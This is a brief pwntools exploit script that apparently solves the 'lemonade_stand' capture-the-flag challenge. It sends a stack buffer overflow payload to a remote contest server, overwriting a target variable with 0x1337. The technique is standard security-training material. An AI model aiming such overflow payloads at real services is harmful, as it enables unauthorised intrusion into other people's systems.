#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./lemonade_stand', checksec=False)

#p = process(elf.path)
p = remote('offsec.m0lecon.it', 13551)
# Your exploit here

# value to find RIP offset: 0x6161617861616177
#RIP_OFFSET = 88

# target address = 0x7fffffffddfc
# buffer address = 0x7fffffffddb0
# found in gdb with p &target before the scanf and p &buffer
target_addr = 0x7fffffffddfc
buffer_addr = 0x7fffffffddb0

offset = target_addr - buffer_addr

payload = b'A' * offset
payload += p64(0x1337)
p.sendline(payload)

p.interactive()
